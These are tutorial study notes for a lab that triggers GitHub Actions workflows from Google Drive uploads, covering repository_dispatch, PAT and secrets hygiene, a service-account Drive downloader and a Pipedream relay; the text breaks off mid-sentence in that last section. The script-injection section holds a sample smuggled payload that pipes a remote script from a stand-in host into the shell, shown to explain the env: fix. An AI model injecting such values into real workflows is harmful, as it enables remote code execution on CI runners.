# drive-ci-lab — study notes

The complete study companion to this lab. `TUTORIAL.md` holds the phase plan and current
status (the *state*); this file holds the explanations, command breakdowns, by-hand
examples, and lessons learned (the *textbook*). It grows as phases complete.

**The lab's goal:** an upload to Google Drive immediately (true push, no polling) triggers
a GitHub Actions workflow that downloads that file onto the runner and processes it.

```
Phase 1          Phase 2              Phase 4/5                 Goal
git push  ──►    curl POST  ──►       Drive upload ──► relay ──► POST
   │                │                                              │
   ▼                ▼                                              ▼
 GitHub event system ──► workflow matches on: ──► fresh VM ──► run.py
```

Every phase only swaps **who sends the event**. The right half never changes.

---

## 1. CI fundamentals — what actually happens

CI has zero magic: *a computer somewhere runs a checklist of shell commands whenever
something happens.*

### The cast of characters

1. **Your machine** — where you edit and `git push`.
2. **GitHub's servers** — store the repo and watch it for **events**.
3. **A runner** — a fresh, disposable VM booted on demand to execute the checklist, then
   destroyed.
4. **The checklist** — a workflow file in `.github/workflows/`: "when X happens, boot a
   machine and run these commands."

### The chain, step by step (as it ran for our first push)

1. `git push` sends commits to GitHub over HTTPS.
2. GitHub's event system emits a **`push` event** — a JSON blob: repo, branch, commit,
   pusher.
3. GitHub asks every file in `.github/workflows/`: *does your `on:` block match this
   event?* `ci.yml` (`on: push`) matches; `drive.yml` (`on: repository_dispatch`) stays
   silent.
4. GitHub queues a **run** and boots a runner: a brand-new Ubuntu VM with nothing of ours
   on it. "Always start from blank" is deliberate — it proves the project builds for
   *anyone from scratch*. ("Works on my machine" is the disease; CI is the cure.)
5. The runner executes the steps top to bottom — each is just a shell command:
   - `actions/checkout@v4` ≈ `git clone` the repo onto the VM
   - `actions/setup-python@v5` ≈ install Python
   - `run: python run.py --hello` → the script prints its line
6. Every command exited `0` → conclusion `success` → the `✓`. Any non-zero exit stops the
   checklist and marks the run `✗`. All stdout/stderr is captured with timestamps.
7. The VM is destroyed. Only the logs and the verdict persist.

### By-hand exercise: *be the runner yourself*

```bash
cd /tmp                                                       # blank machine: no repo here
git clone https://github.com/anden-karlsson/drive-ci-lab.git  # ← actions/checkout@v4
cd drive-ci-lab
python3 --version                                             # ← setup-python (VM had to install it)
python3 run.py --hello                                        # ← the `run:` step
echo "exit code: $?"                                          # ← how GitHub decides ✓ or ✗
rm -rf /tmp/drive-ci-lab                                      # ← GitHub destroying the VM
```

That **is** the entire job — GitHub just does it on their computer, triggered by an event
instead of you typing.

`$?` is a special shell variable holding the previous command's exit code. `0` = success.
CI "success" means nothing more than *every step exited 0*.

---

## 2. Phase 1 — baseline CI (`ci.yml`)

```yaml
name: baseline            # workflow display name (the WORKFLOW column in run lists)

on:
  push:                   # trigger: any push, any branch (no branch filter)

jobs:
  hello:
    runs-on: ubuntu-latest        # boot the latest Ubuntu runner image
    steps:
      - uses: actions/checkout@v4     # clone repo onto the runner
      - uses: actions/setup-python@v5 # install Python
        with:
          python-version: "3.13"
      - run: python run.py --hello    # the actual work
```

Notes:

- `on: push` with no filter fires on **every** push to **any** branch — including pushes
  that only edit workflows or docs. Real projects usually filter:
  `on: push: branches: [main]` (and/or `paths:`) to stop burning runs.
- Runs are fast (~10s) because `setup-python` downloads a pre-built cached Python; nothing
  compiles.

### Reading `gh run list` output

```
STATUS  TITLE                                   WORKFLOW  BRANCH  EVENT  ID           ELAPSED  AGE
✓       phase 1: baseline CI runs dummy run.py  baseline  main    push   29491020943  11s      about 20 minutes ago
```

- **STATUS** — `✓` all jobs succeeded, `✗` failed, spinner/`*` in progress. It is purely
  "did every command exit 0".
- **TITLE** — for push runs: the **commit message** (one reason good commit messages
  matter — they label your CI runs). For `repository_dispatch` runs there is no commit, so
  the **event type** shows instead (`drive-upload`).
- **WORKFLOW** — the `name:` field from the YAML. Distinguishes rows when one push
  triggers several workflows.
- **BRANCH / EVENT** — where and *why*. The EVENT column is the heart of this lab: it
  moves from `push` to `repository_dispatch`.
- **ID** — the run's unique id (API name: `databaseId`); what you pass to
  `gh run view <id>` / the logs endpoint.
- Status vs conclusion (JSON fields): `status` = is it done (`queued`/`in_progress`/
  `completed`); `conclusion` = how it ended (`success`/`failure`/`cancelled`/`skipped`).
  A run can be completed-but-failed — two separate questions.

---

## 3. Toolbox — `gh` CLI patterns (for stock Ubuntu gh 2.45)

Environment fact: this machine runs WSL2 Ubuntu with distro-packaged tools. Ubuntu's repos
**freeze** versions at release and only backport security fixes — so `gh` is 2.45 (2024).
We adapt commands to it rather than upgrading.

### Quirk 1 — `gh` detects pipes and goes non-interactive

`gh run view --log | grep ...` fails with "run or job ID required": with a pipe attached,
`gh` can't show its interactive run picker, so it demands an explicit ID. Piped output also
loses table headers/colors. Fix: always pass an ID when piping.

### Quirk 2 — `gh run view --log` is silently broken on 2.45

GitHub changed the log-archive format; old `gh` unzips it, matches no files, prints
*nothing* and exits `0`. (Silent failure = design flaw; good tools fail loudly.)

**Workaround — fetch the logs zip via the raw API and unzip it ourselves:**

```bash
gh api repos/anden-karlsson/drive-ci-lab/actions/runs/<RUN_ID>/logs > /tmp/logs.zip \
  && unzip -p /tmp/logs.zip | grep -A4 "event action:"
```

- `gh api <path>` — authenticated request to `https://api.github.com/<path>` (this is what
  every gh subcommand does under the hood). This endpoint returns a **zip** (one text file
  per step), hence redirecting to a file.
- `unzip -p` — extract to stdout (**p**ipe), no files created on disk.
- `grep -A4 "pattern"` — matching line **A**nd 4 lines after (captures multi-line JSON).
- ⚠ `<RUN_ID>` is placeholder notation — bash reads literal `<` as "redirect input from a
  file", so `<ID>` errors with `ID: No such file or directory`. Substitute the real number,
  no brackets.

### Scripting best practice: `--json` + `--jq`, never parse tables

```bash
gh run list --limit 1 --json databaseId --jq '.[0].databaseId'
```

- `--json <fields>` — structured output instead of the human table (whose formatting can
  change between versions and contains padding/colors).
- `--jq '<expr>'` — built-in JSON query: output is an array of runs; `.[0]` takes the
  first, `.databaseId` extracts the field. By hand: `[{"databaseId": 123}]` → `.[0]` →
  `{"databaseId": 123}` → `.databaseId` → `123`.
- `$( ... )` — command substitution: run the inner command first, paste its output into
  the outer one. `gh run view $(...) --log` automates "read the ID from the table by hand".

Also useful: `gh run view <id> --json conclusion,status`, `gh workflow list`,
`gh run view <id> --web` (open the browser UI — the per-step ✓/timing view).

### Reading raw Actions logs

- Every line is prefixed with a UTC timestamp.
- `##[group]` / `##[endgroup]` — Actions' log-folding markup (collapsible steps in the web
  UI).
- `[36;1m ... [0m` — ANSI color codes intended for a terminal.
- Content appears **twice** in the zip: each step's standalone file + the full-job log.
  Nothing ran twice — the timestamps are identical to the microsecond.
- The step header echoes the resolved `env:` block — handy for verifying what values were
  actually injected.

---

## 4. Phase 2 — `repository_dispatch` (external events)

### The concept

`on: push` = GitHub notices an event *inside* GitHub. A Drive upload happens *outside* —
GitHub can't see it. `repository_dispatch` is the repo's **inbox for external events**:
anyone with a token can POST to the repo's `/dispatches` API endpoint saying "an external
event happened, here's JSON about it", and workflows listening for that `event_type` fire.
In Phase 4/5 a relay does the POSTing; in Phase 2 *we* are the relay, by hand with curl —
learning the raw mechanics before a service hides them.

Non-obvious rule: **`repository_dispatch` only triggers workflows on the default branch.**
The workflow file must be pushed to `main` before events can reach it. Corollary that bit
us (see §7): the runner executes the workflow **as it exists on `main` at event time**,
not what's on your disk.

### `drive.yml` line by line

```yaml
name: drive

on:
  repository_dispatch:
    types: [drive-upload]     # fires on POST to /dispatches with event_type "drive-upload"

concurrency:
  group: ${{ github.ref }}    # one lane; see the concurrency deep-dive below
  cancel-in-progress: false   # new runs QUEUE behind the in-progress one, never kill it

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: show payload
        env:                  # bridge GitHub-context values into the shell as DATA
          EVENT_ACTION: ${{ github.event.action }}
          PAYLOAD: ${{ toJson(github.event.client_payload) }}
        run: |
          echo "event action: ${EVENT_ACTION}"
          echo "payload: ${PAYLOAD}"
```

- `types: [drive-upload]` — a filter. The type string is invented by us; one repo can
  receive many kinds of dispatches and route them to different workflows. Without
  `types:`, every dispatch would fire this workflow. The workflow knows nothing about
  Drive — Drive enters in Phase 4.
- For dispatch events, `github.event.action` holds the `event_type` string and
  `github.event.client_payload` the sender's arbitrary JSON — the envelope that will later
  carry the Drive file id/name.

### Concurrency deep-dive

Mental model: GitHub keeps one **lane** per group name. Per lane: **at most 1 run in
progress and at most 1 pending.**

- `cancel-in-progress: false` — a new event queues in the pending slot; the running one
  finishes. Right for pipelines where every event is real work.
- `cancel-in-progress: true` — a new event kills the running one. Right when only the
  latest matters (e.g. CI on a PR: push a fix 30s later, the old verdict is worthless —
  kill it, save compute).
- **The gotcha we plan to observe in Phase 4's burst test:** the pending slot holds ONE
  run. Three uploads during a run → #2 goes pending, #3 *replaces* #2, #2 is silently
  cancelled. Concurrency prevents parallel stampedes but is **not a real queue — bursty
  producers lose events.** Real fix: make the run discover *all* unprocessed work instead
  of trusting one event per file (Phase 5's "push-to-pull" relay query).
- Shop analogy: one service counter (in progress) + one chair (pending). `true` = the new
  customer shoves the current one out the door; `false` = they take the chair. Either way
  a third customer takes the chair *from* the second, who just leaves.
- Scoping: groups are **repo-wide, not per-workflow**. Two workflows using the same group
  name share a lane and queue/cancel each other.
- Our `group: ${{ github.ref }}`: the copy-paste idiom for per-branch lanes in push/PR
  workflows. For dispatch events `github.ref` is *always* `refs/heads/main`, so it's
  functionally one lane — equivalent to a fixed name like `drive-run` today. A fixed
  intent-named group can't accidentally collide if another workflow later adopts the same
  `${{ github.ref }}` idiom; kept as-is as an informed choice.
- Default without a concurrency block: unlimited parallel runs.

### The `run:` block — three stacked mechanisms

1. **`|` — YAML literal block scalar**: everything indented below is one multi-line
   string, newlines preserved.
2. **The string becomes one shell script**, executed with `bash -e -o pipefail`. `-e` =
   abort on the first non-zero command; `-o pipefail` = a pipeline fails if *any* command
   in it fails, not just the last. (Same as the `set -euo pipefail` best-practice header
   in hand-written scripts.)
3. **`${{ ... }}` is template substitution, not shell.** GitHub's server evaluates the
   expression and **pastes the literal result into the script text before bash runs**.
   Rule of thumb: `${{ ... }}` = GitHub's world (server-side); `${...}` = bash's world.
   The `env:` block is the bridge between them.

### Script injection — why the `env:` indirection

If you write `run: echo "payload: ${{ toJson(github.event.client_payload) }}"`, the
payload text is pasted **into shell code**. A payload containing `"; curl evil.sh | sh; "`
becomes executable shell. This is **script injection**, the #1 real-world Actions
vulnerability — critical here because Phase 4 hands the sending to external services.

The fix: pass untrusted event data through `env:`. Environment variable *values* are data
— bash expands them but never parses them as code:

```yaml
env:
  PAYLOAD: ${{ toJson(github.event.client_payload) }}   # substitution happens HERE (into a value)
run: |
  echo "payload: ${PAYLOAD}"                            # bash reads a variable — pure data
```

Related trap: `GITHUB_EVENT_ACTION` **does not exist**. GitHub predefines some default env
vars (`GITHUB_EVENT_NAME`, `GITHUB_REPOSITORY`, `GITHUB_SHA`, …) but the event's *action*
lives only in the `github.event` context — you must bridge it yourself
(`EVENT_ACTION: ${{ github.event.action }}`). An unset bash variable expands to empty, no
error — our first dispatch printed `event action:` blank because of this.

### Personal Access Tokens (PATs)

- `/dispatches` changes repo state (starts workflows) → authentication required. In the
  terminal `gh` is already authenticated, but the Phase 4/5 relay is not *us* — it needs
  its own credential. A PAT is a password-like string acting as you, with restrictions you
  choose.
- **Fine-grained (modern) vs classic:** classic PATs are all-or-nothing (`repo` scope =
  full control of every repo you own). Fine-grained = *this one repo, these specific
  permissions, this expiry*. Leak blast radius: one throwaway repo for a few weeks.
  **Least privilege.**
- Ours: `drive-ci-lab-dispatch`, only `drive-ci-lab`, **Contents: Read and write**, 30-day
  expiry (dies on its own even if teardown is forgotten). Counterintuitively, Contents
  write is what `/dispatches` requires — there is no "dispatch" permission. The API
  confirmed it in a response header: `x-accepted-github-permissions: contents=write`.
- Creation is browser-only (Settings → Developer settings → Personal access tokens →
  Fine-grained) — deliberate on GitHub's part. Token shown exactly once. Name tokens after
  their job so future-you knows what to revoke.

### The curl — anatomy of a webhook-style POST

Exploration form (see everything):

```bash
curl -i -X POST \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer ${DRIVE_PAT}" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/anden-karlsson/drive-ci-lab/dispatches \
  -d '{"event_type":"drive-upload","client_payload":{"file_name":"test.csv","note":"fired by hand"}}'
```

- `curl` — raw HTTP; this is literally what every relay/webhook service does under the hood.
- `-i` — include response **headers**. Crucial: success is `204 No Content` — an empty
  body. Without `-i`, success looks like nothing happened.
- `-X POST` — GET reads, POST submits/creates; firing an event is a create.
- `Accept: application/vnd.github+json` — "answer in GitHub's JSON dialect" (recommended
  on all API calls).
- `Authorization: Bearer ${DRIVE_PAT}` — the auth. "Bearer" = *whoever bears this token is
  authorized* — why tokens must never leak. Bash substitutes the variable before sending.
- `X-GitHub-Api-Version: 2022-11-28` — pins API version so future changes can't silently
  alter behavior; best practice for anything scripted.
- `-d '{...}'` — the body. `event_type` must match the workflow's `types:` **exactly**;
  `client_payload` is arbitrary JSON.

Scripting form (status code only): replace `-i` with

```bash
curl -s -o /dev/null -w "%{http_code}\n" ...
```

`-s` silent (no progress meter), `-o /dev/null` discard the (empty) body,
`-w "%{http_code}"` write just the status code after finishing. Output: `204`.

Response headers worth knowing (from our real 204):

- `github-authentication-token-expiration` — when the PAT self-destructs.
- `x-accepted-github-permissions: contents=write` — which permission the endpoint checked.
- `x-ratelimit-limit: 5000` / `-remaining` — authenticated calls get 5000/hour. A runaway
  relay looping dispatches would eat this.
- The rest (CSP, `x-frame-options`, HSTS…) is boilerplate browser-security — ignorable for
  API work.

### HTTP status taxonomy (memorize this)

- **2xx — success.** `204 No Content` = "done, body intentionally empty".
- **4xx — your fault; retrying identically is pointless.**
  - `401` — bad/missing token (we hit this: empty `${DRIVE_PAT}` → literally
    `Authorization: Bearer ` → unauthorized).
  - `404` — token valid but lacks access: GitHub says "not found" rather than "forbidden"
    to avoid confirming a private repo exists.
  - `422` — malformed JSON body.
- **5xx — their fault; retrying is exactly right.** We hit a transient `503` from
  `gh run list`; the second attempt succeeded. Incidents: https://www.githubstatus.com
- Phase 5 design input: a relay should **retry 5xx with backoff** and **treat 4xx as a bug
  to log**.

### Secrets hygiene (lessons lived, not just read)

- **Never type a secret into a command line** — everything typed lands in
  `~/.bash_history` in plain text. Capture it instead:

  ```bash
  read -rs DRIVE_PAT     # -s silent (no echo), -r raw (backslashes untouched); paste, Enter
  echo ${#DRIVE_PAT}     # ${#var} = length; verifies it landed WITHOUT printing it
  ```

- **Env vars are per-shell-session, not per-machine.** New terminal / new script / fresh
  shell = empty environment. Our 401 was exactly this. It's also *why CI has repo
  secrets* (Phase 3) instead of assuming variables exist.
- **File-based idiom for persistence:** `.env.txt` containing `DRIVE_PAT=github_pat_...`;
  load with `source .env.txt` (`source` executes the file's lines *in the current shell*,
  so the assignment sticks — a plain `./file` would run in a subshell and the variable
  would die with it). Lock it down: `chmod 600 .env.txt` (6 = read+write owner, 0 group,
  0 others).
- **`.gitignore` the secret file before it can be committed:** pattern `.env*` covers
  `.env`, `.env.txt`, `.env.local`. `.gitignore` itself IS committed — shared convention
  protecting everyone. A pushed secret is compromised forever: GitHub scans public repos
  and auto-revokes leaked PATs, bots scrape them within seconds, history rewrites don't
  unleak — revocation is the only fix.
- **`git add <specific files>`, not `git add .`**, whenever anything unfamiliar sits in
  the working tree; `git status` before every commit. (Our `.env.txt` was one careless
  `git add .` away from publication.)

### Phase 2 checkpoint — what was proven

`curl POST (204)` → run appeared with EVENT `repository_dispatch`, TITLE `drive-upload`
(no commit behind it) → log showed the `env:` block injecting `EVENT_ACTION: drive-upload`
and the step printing the payload JSON round-tripped from the hand-typed curl body.
External HTTP request → GitHub event system → fresh VM → our data. The skeleton is done.

---

## 5. Gotchas log (chronological war stories)

| Gotcha | Symptom | Root cause → fix |
|---|---|---|
| heredoc wrote `ci.yml` to repo root | workflow never triggered | wrong path → `mv` into `.github/workflows/` |
| `checkout @v4` (space) | invalid action ref | typo → `checkout@v4` |
| `gh run view --log \| grep` | "run or job ID required" | pipe → non-interactive mode, no picker → pass explicit ID |
| `gh run view <id> --log` empty, exit 0 | no output at all | gh 2.45 can't parse new log-archive format → `gh api .../logs` + `unzip -p` |
| `<ID>` pasted literally | `ID: No such file or directory` | bash parses `<` as input redirection → placeholders get substituted, no brackets |
| `event action:` printed blank | payload OK, action empty | (a) `GITHUB_EVENT_ACTION` doesn't exist as a default var; (b) fix was edited locally but **not pushed** — dispatch runs use `main`, not your disk |
| curl returned `401` | dispatch refused | `DRIVE_PAT` empty in a fresh shell → env vars are per-session; `source .env.txt` in the same compound command |
| `.env.txt` in `git status` | one `git add .` from leaking | `.gitignore` with `.env*`; add files by name |
| `gh run list` → `503` | listing failed once | GitHub transient server error → 5xx = retry; 4xx = don't |
| uploaded CSV "vanished" | query finds nothing; folder shows a Sheet named `test3` | Drive **auto-converted** the CSV to a Google Sheet (no binary → no `get_media`, different name) → Drive gear → Settings → uncheck "Convert uploads to Google Docs editor format", re-upload |
| still not found after re-upload | `no file named 'test3.csv'` but file visibly there | file's real name was `test3` — **Windows Explorer hides extensions**, and Drive reports `text/csv` from content-sniffing regardless of name → rename in Drive; enable View → "File name extensions" in Explorer |
| suspected sharing failure | (false alarm) | unshared folders DO fail silently as empty results — but the authoritative test is querying **as the SA** (diagnostic script below), not secondary views; the owner's share dialog is ground truth for the ACL |
| SA key still `untracked` after adding to `.gitignore` | file not ignored | two separate bugs, both silent: (a) `echo`ing two patterns created one mashed line `drive-ci-test*.venv/` matching nothing; (b) **`.gitignore` has no inline comments** — `pattern  # note` is read literally, and trailing spaces are significant. Every pattern gets its own bare line; comments on their own lines. **Always verify with `git status` that the file disappears** — a dead pattern looks identical to a working one |

---

---

**How to use the rest of this document:** work through the phases below on your own,
step by step — this is the lab manual. Use the chat only when something breaks or a
concept won't click. After each ✅ CHECKPOINT, update the status section in `TUTORIAL.md`.
Boxes marked **⚠ VERIFY** are external facts that must be checked against live docs when
you reach them (UIs and limits drift; this doc refuses to assert what it can't be sure of).

---

## 6. Phase 3 walkthrough — service account + Drive download

**Goal:** the runner authenticates to Google Drive *without a human*, and `run.py`
downloads the file named in the dispatch payload.

**The new concept — service accounts.** Your CI runner can't do the interactive "Sign in
with Google" browser dance. A **service account (SA)** is a robot Google identity: it has
its own email address and authenticates with a cryptographic **JSON key** instead of a
password. The trick that makes Drive access simple: an SA's email can be *shared with*
like any human — no IAM roles needed. Access comes from the share, not from Google Cloud
permissions.

### 3.1 Create a GCP project

Browser: https://console.cloud.google.com → project picker (top bar) → **New Project** →
name `Drive-ci-test` (the name we used) → Create, then make sure it's the *selected*
project (picker shows it). Note the auto-generated **project ID** (lowercase, possibly
with a number suffix, e.g. `drive-ci-test-465912`) — commands use the ID, not the display
name.

Why a project? GCP projects are isolation containers: APIs you enable, credentials you
create, and quotas all live inside one project. A throwaway project makes teardown
trivial — delete the project, everything in it dies. The Drive API is free; no billing
account needed.

### 3.2 Enable the Drive API

Console → **APIs & Services → Library** → search "Google Drive API" → **Enable**.

Why is this a step at all? Every API is *off* by default per project — Google makes you
opt in per project so a leaked credential can only use APIs someone deliberately enabled.

### 3.3 Create the service account

Console → **IAM & Admin → Service Accounts** → **Create service account**:

- Name: `drive-ci-test` (we reused the project name; SA IDs are always lowercase).
- **Skip both optional grant steps** ("grant this SA access to project", "grant users
  access to this SA") — leave empty, click through. This is the point made above: we grant
  access via a Drive *share*, so the SA needs zero IAM roles. Least privilege again.

Note the generated email: `drive-ci-test@<project-id>.iam.gserviceaccount.com`.

### 3.4 Create and secure the JSON key

SA list → click `drive-ci-test` → **Keys** tab → **Add key → Create new key → JSON** →
Create. A file downloads (Windows side; in WSL it's under `/mnt/c/Users/<you>/Downloads/`).

Look inside it once (`code <file>`): `client_email` (the SA's email) and `private_key` (a
PEM block) are the parts that matter — the library signs a login assertion with that
private key; Google verifies with the public half it kept. **This file IS the credential.**
Move it somewhere safe and lock it down:

```bash
mv /mnt/c/Users/<you>/Downloads/drive-ci-test-*.json ~/drive-ci-test-sa.json
chmod 600 ~/drive-ci-test-sa.json
```

- Stored in `~`, *outside the repo* — can't be committed even without `.gitignore`.
- `chmod 600` — owner read/write only, same as `.env.txt`.

### 3.5 Create the Drive folder and share it with the robot

1. drive.google.com → New → Folder → `drive-ci-inbox`.
2. Right-click → Share → paste the SA email from 3.3 → role **Viewer** (it only needs to
   read) → uncheck "Notify" (robots don't read email) → Share.
3. Open the folder; copy the **folder ID** from the URL:
   `https://drive.google.com/drive/folders/<THIS_LONG_ID>`.

### 3.6 Give the runner the credential — repo secrets

The "env vars are per-shell" lesson, CI edition: the runner starts with a blank
environment, so GitHub provides **Actions secrets** — encrypted values injected only when
a workflow references them, auto-masked as `***` if they ever appear in logs.

```bash
gh secret set GDRIVE_SA_KEY < ~/drive-ci-test-sa.json
source .env.txt && gh variable set GDRIVE_FOLDER_ID --body "${GDRIVE_FOLDER_ID}"
```

The secret is the **entire key file as one opaque blob** — all fields, multi-line PEM and
all. `run.py` will `json.loads()` it back; the auth library needs several fields
(`client_email`, `private_key`, `token_uri`, …), so splitting them into separate secrets
would just mean reassembling them by hand. One blob in, `json.loads` out.

The folder ID lives in `.env.txt` as `GDRIVE_FOLDER_ID=<id>` — **same name everywhere**
(local shell, repo variable, workflow `env:`, `os.environ` in Python) so there's no
mapping to remember; the `source` line above sets the repo variable straight from it,
never pasting the ID twice.

- `gh secret set NAME < file` — reads the value from stdin (`<` redirection — the same
  operator that bit us in the `<ID>` gotcha, used properly this time: it feeds the file's
  contents in without the secret touching the command line or history). Encrypted
  client-side before upload; not even you can read it back — only overwrite or delete.
- `gh variable set` — a **variable**, not a secret: plaintext, visible in the UI. Right
  choice for the folder ID (config, not credential). Distinction: *would it hurt if this
  appeared in a public log?* Yes → secret; no → variable.
- Verify: `gh secret list` and `gh variable list`.

### 3.7 Extend `run.py`

`code run.py` — replace the whole file with:

```python
"""Dummy pipeline for the Drive-event-driven CI lab. Grows a flag per phase."""
import argparse
import io
import json
import os
import sys

parser = argparse.ArgumentParser()
parser.add_argument("--hello", action="store_true", help="phase 1: prove CI runs this file")
parser.add_argument("--download", metavar="FILE_NAME",
                    help="phase 3: download FILE_NAME from the shared Drive folder")
args = parser.parse_args()

if args.hello:
    print("hello from run.py - executed by CI")

if args.download:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    from googleapiclient.http import MediaIoBaseDownload

    key_info = json.loads(os.environ["GDRIVE_SA_KEY"])
    creds = service_account.Credentials.from_service_account_info(
        key_info, scopes=["https://www.googleapis.com/auth/drive.readonly"])
    drive = build("drive", "v3", credentials=creds)

    folder_id = os.environ["GDRIVE_FOLDER_ID"]
    query = (f"name = '{args.download}' "
             f"and '{folder_id}' in parents and trashed = false")
    resp = drive.files().list(q=query, fields="files(id, name, size)").execute()
    files = resp.get("files", [])
    if not files:
        sys.exit(f"ERROR: no file named {args.download!r} in folder {folder_id}")

    file = files[0]
    request = drive.files().get_media(fileId=file["id"])
    buf = io.BytesIO()
    downloader = MediaIoBaseDownload(buf, request)
    done = False
    while not done:
        _, done = downloader.next_chunk()

    out_path = f"downloaded_{file['name']}"
    with open(out_path, "wb") as f:
        f.write(buf.getvalue())
    print(f"downloaded {file['name']} ({file.get('size', '?')} bytes) -> {out_path}")
```

Walkthrough of the new pieces:

- **Imports inside `if args.download:`** — so `--hello` still works on a machine without
  the Google libraries installed (the Phase 1 baseline keeps passing).
- **`json.loads(os.environ["GDRIVE_SA_KEY"])`** — the whole key JSON arrives as one env
  var (from the repo secret in CI, from `export` locally); parse it back into a dict.
  `from_service_account_info` takes a dict; its sibling `..._from_service_account_file`
  takes a path — env-var style means no key file ever exists on the runner's disk.
- **`scopes=[".../drive.readonly"]`** — OAuth scopes are *self-imposed* limits on what
  this login may do. Read-only is all we need; if the key leaks, it can't delete/write.
  Least privilege, third appearance.
- **`build("drive", "v3", ...)`** — constructs the API client from Google's published
  service description; `drive.files()` then mirrors the REST endpoints 1:1.
- **The `q=` query** — Drive's own search mini-language (strings quoted, `in parents` for
  folder membership, `trashed = false` because deleted files still match names).
  `fields=` asks only for what we use — good API citizenship and faster.
- **`sys.exit("message")`** — prints to stderr and exits with code 1 → the CI step FAILS.
  That's deliberate: "file not found" must turn the run red, not print-and-pass (recall:
  CI success == every command exited 0).
- **`get_media` + `MediaIoBaseDownload`** — `files().get(...)` fetches *metadata*;
  `get_media` fetches *contents*. The downloader pulls in chunks (matters for big files;
  the loop runs once for small ones) into an in-memory buffer, then we write it out.

### 3.8 Test locally BY HAND first (always do this before CI)

Debugging on the runner is slow (push, wait, download logs). Be the runner locally first:

```bash
sudo apt install python3-venv python3-pip    # once, if missing (stock Ubuntu)
python3 -m venv .venv                        # project-local package sandbox
source .venv/bin/activate                    # this shell now uses .venv's python/pip
pip install google-api-python-client google-auth
echo ".venv/" >> .gitignore                  # never commit an environment

export GDRIVE_SA_KEY="$(cat ~/drive-ci-test-sa.json)"
source .env.txt && export GDRIVE_FOLDER_ID     # value comes from .env.txt; export marks it for child processes
```

- **venv** — the standard isolation for Python deps: packages install into `.venv/`
  instead of polluting system Python (which on Ubuntu is apt-managed and will actively
  refuse `pip install`). `deactivate` exits; re-`source` to return.
- **`export VAR=...`** — like plain assignment, but marks the variable to be inherited by
  child processes (python). `$(cat file)` pastes the file's contents as the value — same
  per-session rules as `DRIVE_PAT`.

Now: upload any small file by hand into `drive-ci-inbox` (say `test3.csv`), then:

```bash
python run.py --download test3.csv
```

Expected: `downloaded test3.csv (N bytes) -> downloaded_test3.csv`. Also test the failure
path: `python run.py --download nope.csv; echo "exit: $?"` → ERROR line and `exit: 1`.
Add `downloaded_*` to `.gitignore` too.

**When "no file named …" strikes, debug with the robot's eyes** — a throwaway heredoc
script that lists everything the SA can see, with exact quoted names (`!r` exposes
missing extensions/trailing spaces):

```bash
python - <<'EOF'
import json, os
from google.oauth2 import service_account
from googleapiclient.discovery import build
creds = service_account.Credentials.from_service_account_info(
    json.loads(os.environ["GDRIVE_SA_KEY"]),
    scopes=["https://www.googleapis.com/auth/drive.readonly"])
drive = build("drive", "v3", credentials=creds)
print("SA identity:", json.loads(os.environ["GDRIVE_SA_KEY"])["client_email"])
print("expected folder:", os.environ["GDRIVE_FOLDER_ID"])
files = drive.files().list(pageSize=20,
    fields="files(id,name,mimeType,parents)").execute().get("files", [])
if not files:
    print("SA sees NOTHING -> sharing problem (re-share with the exact SA identity above)")
for f in files:
    print(f"  name={f['name']!r}  parents={f.get('parents')}  {f['mimeType']}")
EOF
```

Read it: empty → sharing; wrong `parents` → folder ID; unexpected `name` → naming
(conversion or hidden extension — see gotchas §5).

### 3.9 Wire it into `drive.yml`

Replace the `show payload` step's job with (full `jobs:` block for clarity):

```yaml
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.13"
      - run: pip install google-api-python-client google-auth
      - name: download file from Drive
        env:
          GDRIVE_SA_KEY: ${{ secrets.GDRIVE_SA_KEY }}
          GDRIVE_FOLDER_ID: ${{ vars.GDRIVE_FOLDER_ID }}
          FILE_NAME: ${{ github.event.client_payload.file_name }}
        run: |
          echo "processing: ${FILE_NAME}"
          python run.py --download "${FILE_NAME}"
```

- `secrets.GDRIVE_SA_KEY` / `vars.GDRIVE_FOLDER_ID` — the two stores from 3.6, reached via
  their contexts. Secrets are masked in logs automatically.
- `client_payload.file_name` → env var — same injection-safe bridge as Phase 2. The
  runner has no venv (fresh VM!), hence the `pip install` step — on the runner, system
  pip is fine because the whole VM is disposable.
- `"${FILE_NAME}"` is quoted so a file name with spaces stays one argument.

Commit by name and push (`git add run.py .github/workflows/drive.yml .gitignore`,
message like `phase 3: download payload-named file from Drive`).

### 3.10 ✅ CHECKPOINT 3

```bash
source .env.txt && curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer ${DRIVE_PAT}" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/anden-karlsson/drive-ci-lab/dispatches \
  -d '{"event_type":"drive-upload","client_payload":{"file_name":"test3.csv"}}'
```

→ `204` → `gh run list --limit 1` → grab ID → logs zip idiom (§3 toolbox), grep for
`downloaded`. Pass = the log shows `downloaded test3.csv (N bytes)`. A curl-fired run
fetched a real file from Drive. The only manual part left is the curl itself.

---

## 7. Phase 4 walkthrough — relay A: Pipedream (managed)

**Goal (milestone 1):** upload a file to the folder → workflow runs and downloads *that
file* within seconds — no human in the loop. Pipedream is a hosted automation service: it
maintains the Drive **watch channel** (Google's push-notification subscription) and its
renewal for you, so you get true push without owning the plumbing yet. Phase 5 then
rebuilds this by hand so you know what it was doing.

### 4.1 Create the trigger

1. https://pipedream.com → sign up (free tier is enough) → **New workflow**.
2. Trigger: search **Google Drive**, pick the *instant* new-file trigger.

   > **⚠ VERIFY:** exact trigger name in the current UI (historically **"New Files
   > (Instant)"**). "Instant" is the property that matters — it means webhook/watch-based
   > true push. Avoid any trigger described as polling/schedule-based; using one would
   > silently violate the lab's no-polling requirement.

3. Connect the Google account that owns `drive-ci-inbox` (OAuth consent dance — this is
   the human sign-in the SA exists to avoid; fine here because Pipedream is user-facing).
4. Configure the trigger to watch the `drive-ci-inbox` folder specifically.
5. Generate a test event: upload a file to the folder; inspect the emitted event in the
   Pipedream UI and **note the JSON paths for the file's name and id** (you'll reference
   them in the next step; the exporter shows copyable paths like
   `steps.trigger.event.<something>.name`).

### 4.2 Store the PAT in Pipedream

Pipedream project → **Environment variables** (or workflow-level env) → add
`DRIVE_PAT` = the token. Same principle as everywhere: config UI / env store, never
